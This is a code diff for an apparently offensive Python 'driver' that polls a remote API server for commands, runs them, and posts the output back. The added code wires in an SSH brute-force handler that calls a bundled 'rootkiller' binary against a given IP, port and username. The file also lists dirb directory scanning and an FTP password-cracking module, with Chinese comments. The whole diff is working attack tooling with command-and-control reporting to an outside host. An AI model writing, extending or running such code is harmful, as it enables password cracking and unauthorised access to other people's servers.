@@ -24,7 +24,7 @@ fn_object = {
     "IP": get_my_ip(),
     "os": os_name,
     "ssh密码破解模块": {
-        "Command":"pwd_attacl",
+        "Command":"ssh_brute",
         "Input":True
     },
     "ftp密码破解模块": {
@@ -72,20 +72,20 @@ command = 'none'
 def input_console():
     global command
         
+def send_reverse_ok():
+    requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":"收到指令正在执行!"}))
+    time.sleep(0.5)
+    requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":"none"}))
 
 def deal_command(command):
     command = str(command).strip()
-
-    def send_ok():
-        requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":"收到指令正在执行!"}))
-
     if command == '' or command == 'none':
         return
     else:
-        threading.Thread(target=send_ok).start()
+        send_reverse_ok()
         print("[INFO] 收到命令: "+command)
         # requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":"收到指令正在执行!"}))
-        if command == 'quit':
+        if command == 'quit':                                                                                                                                                                                                                                                                                                                      
             exit()
         elif command == '':
             return
@@ -93,6 +93,24 @@ def deal_command(command):
             target_website = command[5:]
             command = dirb_module.main(target_website)
             target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":command}))
+
+        elif command.startswith('ssh_brute '):
+            all_args = command.split(' ')
+            ip = all_args[1]
+            port = all_args[2]
+            user = all_args[3]
+    
+            run_command = ''
+            if os_name == 'Windows':
+                run_command = './hackerstack_driver/rootkiller.exe --ssh '+ip+' '+port+' '+user
+            else:
+                run_command = './hackerstack_driver/rootkiller --ssh '+ip+' '+port+' '+user
+
+            # 获取命令行输出
+            command = os.popen(run_command).read()
+            print(command)
+            requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":command}))
+            return
 
 def init_driver():
     print("[INFO] 初始化驱动程序附加组件")
@@ -117,7 +135,7 @@ if __name__ == '__main__':
             except BaseException as e:
                 target = requests.post(api_server+"/push/"+driver_code, timeout=10,data=json.dumps({"content":e}))
             command = 'none'
-            time.sleep(0.4)
+            time.sleep(0.3)
         # r = requests.get(api_server+"/virus_clear_command/"+driver_code)
     except:
         exit()
